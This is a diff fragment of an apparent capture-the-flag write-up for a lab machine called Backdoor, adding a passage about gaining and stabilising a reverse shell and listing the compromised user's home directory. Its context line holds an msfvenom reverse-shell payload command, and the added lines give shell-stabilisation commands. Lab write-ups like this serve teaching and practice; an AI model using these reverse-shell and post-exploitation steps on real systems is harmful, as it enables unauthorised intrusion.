@@ -234,4 +234,39 @@ Command:  msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 PrependF
 ```
 
 Now i'll run the exploit
+![image](https://user-images.githubusercontent.com/113513376/221272717-01b8b3e8-85a8-44cd-91cb-c52095fce41b.png)
+
+We have shell now 👽
+
+Lets escalate priv 
+
+But first we need to stabilize our shell
+
+```
+python3 -c "import pty; pty.spawn('/bin/bash')"
+CTRL +Z
+stty raw -echo;fg
+export TERM=xterm
+reset
+```
+
+Only one user on the box
+
+```
+user@Backdoor:/home/user$ ls -al
+total 36
+drwxr-xr-x 6 user user 4096 Nov 10  2021 .
+drwxr-xr-x 3 root root 4096 Nov 10  2021 ..
+lrwxrwxrwx 1 root root    9 Jul 18  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 user user 3771 Feb 25  2020 .bashrc
+drwx------ 2 user user 4096 Nov 10  2021 .cache
+drwx------ 3 user user 4096 Nov 10  2021 .config
+drwx------ 4 user user 4096 Nov 10  2021 .gnupg
+drwxrwxr-x 3 user user 4096 Nov 10  2021 .local
+-rw-r--r-- 1 user user  807 Feb 25  2020 .profile
+-rw-r----- 1 root user   33 Feb 24 19:20 user.txt
+user@Backdoor:/home/user$ ls /home
+user
+user@Backdoor:/home/user$ 
+```
 
